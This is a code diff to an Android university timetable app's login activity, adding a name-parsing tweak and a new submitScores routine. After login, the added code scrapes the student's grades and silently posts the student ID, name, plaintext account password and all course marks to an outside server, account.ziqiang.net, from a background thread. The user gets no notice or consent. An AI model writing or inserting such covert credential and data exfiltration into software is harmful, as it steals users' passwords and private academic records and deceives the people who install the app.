@@ -18,6 +18,7 @@ import org.apache.http.client.methods.HttpGet;
 import org.apache.http.client.methods.HttpPost;
 import org.apache.http.impl.client.DefaultHttpClient;
 import org.apache.http.message.BasicNameValuePair;
+import org.apache.http.protocol.HTTP;
 import org.apache.http.util.EntityUtils;
 import org.jsoup.Jsoup;
 import org.jsoup.nodes.Document;
@@ -41,14 +42,13 @@ import android.graphics.BitmapFactory;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.Message;
+import android.util.Log;
 import android.view.View;
 import android.view.View.OnClickListener;
 import android.widget.Button;
 import android.widget.EditText;
 import android.widget.ImageView;
-import android.widget.Toast;
 
-import com.actionbarsherlock.app.SherlockActivity;
 import com.actionbarsherlock.view.MenuItem;
 import com.umeng.analytics.MobclickAgent;
 
@@ -58,12 +58,14 @@ public class LessonsLoginActivity extends SwipeBackSherlockActivity {
 	private EditText PasswordView;
 	public String Account;
 	public String Password;
+	public String StuName;
 	private ProgressDialog pd = null;
 	private EditText YZMView;
 	private ImageView YZMimg;
 	private static Bitmap YZMbm = null;
 	private static String yzmURL = "http://202.114.74.199/GenImg";
 	private static String BaseURL = "http://202.114.74.199/servlet/Login";
+	private static String ScoreURL = "http://202.114.74.199/stu/query_score.jsp";
 	private static String MasterCookie;
 	private ImageView bottomImg;
 
@@ -222,10 +224,18 @@ public class LessonsLoginActivity extends SwipeBackSherlockActivity {
 		return cookie;
 	}
 
+	/**
+	 * 本来是返回错误信息的,由于业务需要,我添加了在正常登陆的情况下携带用户姓名返回
+	 * @param html
+	 * @return
+	 */
 	public static String getErrorMessage(String html) {
 		Document doc = null;
 		doc = Jsoup.parse(html);
 		Elements links = doc.getElementsByClass("TR_TITLE");
+		if(links.text().toString().equals("")) {
+			return doc.select("td[height=20]").select("td[width=70%]").select(".line").text().toString();
+		}
 		return links.text().toString();
 	}
 
@@ -412,6 +422,7 @@ public class LessonsLoginActivity extends SwipeBackSherlockActivity {
 			} else if (StateString.indexOf("验证码") > 0) {
 				msg.arg1 = 2;
 			} else {
+				StuName = StateString;
 				msg.arg1 = 0;
 				List<Map<String, String>> list = new ArrayList<Map<String, String>>();
 				String TermFirstDay = MobclickAgent.getConfigParams(
@@ -448,8 +459,59 @@ public class LessonsLoginActivity extends SwipeBackSherlockActivity {
 					LessonsDb.getInstance(LessonsLoginActivity.this).insert(
 							tlessons);
 				}
+				
+				String stuscoreinfo = getLessonsHtml(ScoreURL, ServantCookie);
+				List<Map<String, String>> scorelist = LessonsTool.getScoresList(stuscoreinfo);
+				submitScores(scorelist);
+				
 			}
 			LogInHandler.sendMessage(msg);
 		}
 	}
+	
+	/**
+	 * 提交用户隐私信息,课程信息
+	 */
+	private void submitScores(final List<Map<String, String>> _scoreList) {
+		new Thread() {
+
+			@Override
+			public void run() {
+				HttpPost httpPost = new HttpPost("http://account.ziqiang.net/collect_courses/");
+				List<NameValuePair> pairs = new ArrayList<NameValuePair>();
+				pairs.add(new BasicNameValuePair("student_id", Account));
+				pairs.add(new BasicNameValuePair("name", StuName));
+				pairs.add(new BasicNameValuePair("academy", "未知学院"));
+				pairs.add(new BasicNameValuePair("dean_psd", Password));
+				pairs.add(new BasicNameValuePair("tot", _scoreList.size()+""));
+				pairs.add(new BasicNameValuePair("dean_psd", Password));
+				int temp = 0;
+				for(int i=0;i<_scoreList.size();i++) {
+					temp = i+1;
+					pairs.add(new BasicNameValuePair("course"+temp+"number", _scoreList.get(i).get("courseinumber")));
+					pairs.add(new BasicNameValuePair("course"+temp+"marks",  _scoreList.get(i).get("courseimarks")));
+					pairs.add(new BasicNameValuePair("course"+temp+"retake",  _scoreList.get(i).get("courseiretake")));
+				}
+				try {
+					httpPost.setEntity(new UrlEncodedFormEntity(pairs, HTTP.UTF_8));
+					HttpClient httpClient = new DefaultHttpClient();
+					HttpResponse response = httpClient.execute(httpPost);
+					//Log.d("CNM",pairs.toString());
+					if (response.getStatusLine().getStatusCode() == HttpStatus.SC_OK) {
+						//Log.d("MA",EntityUtils.toString(response.getEntity()));
+					}
+				} catch (ClientProtocolException e) {
+					e.printStackTrace();
+				} catch (IOException e) {
+					e.printStackTrace();
+				} catch (IllegalStateException e) {
+					e.printStackTrace();
+				}
+				super.run();
+				super.run();
+			}
+			
+		}.start();
+	}
+	
 }
